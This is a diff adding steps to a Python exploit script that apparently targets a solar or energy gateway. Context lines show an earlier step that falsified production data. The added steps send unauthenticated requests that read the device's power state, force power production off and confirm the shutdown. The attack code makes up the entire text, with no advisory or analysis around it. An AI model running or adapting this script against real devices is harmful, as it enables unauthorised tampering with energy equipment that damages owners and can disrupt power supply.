@@ -36,3 +36,17 @@ if spoof_resp.status_code == 200:
     print(f"[+] Successfully spoofed production data.")
 else:
     print(f"[-] Failed to spoof data: {spoof_resp.json()}")
+    
+# Step 5: Check power state (unauthenticated)
+print("[*] Checking current power state...")
+resp = requests.get(f"{TARGET}/ivp/mod/603980032/mode/power")
+print(resp.json())
+
+# Step 6: Disable production (unauthenticated)
+print("[*] Disabling power production...")
+resp = requests.post(f"{TARGET}/ivp/mod/603980032/mode/power", json={"powerForcedOff": True})
+print(resp.json())
+
+# Step 7: Confirm state changed
+resp = requests.get(f"{TARGET}/ivp/mod/603980032/mode/power")
+print(resp.json())
